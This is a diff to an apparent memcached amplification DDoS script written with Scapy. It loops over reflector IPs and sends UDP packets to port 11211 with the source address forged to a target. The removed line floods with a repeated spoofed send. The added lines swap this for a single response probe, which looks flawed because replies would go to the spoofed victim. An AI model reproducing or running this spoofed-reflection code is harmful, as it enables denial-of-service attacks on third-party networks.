@@ -126,8 +126,11 @@ while True:
         while datetime.datetime.now() < end_time:
             for ip in ip_array:
                 print(f'[+] Sending forged payloads to: {ip}')
-                with suppress_stdout():
-                    send(IP(src=target, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=data), count=power)
+                response = sr1(IP(src=target, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=data), timeout=2, verbose=0)
+                if response:
+                    print(f'[✓] Response received from {ip}')
+                else:
+                    print(f'[!] No response from {ip}')
 
         print('[✓] Task complete! Exiting platform.')
         break
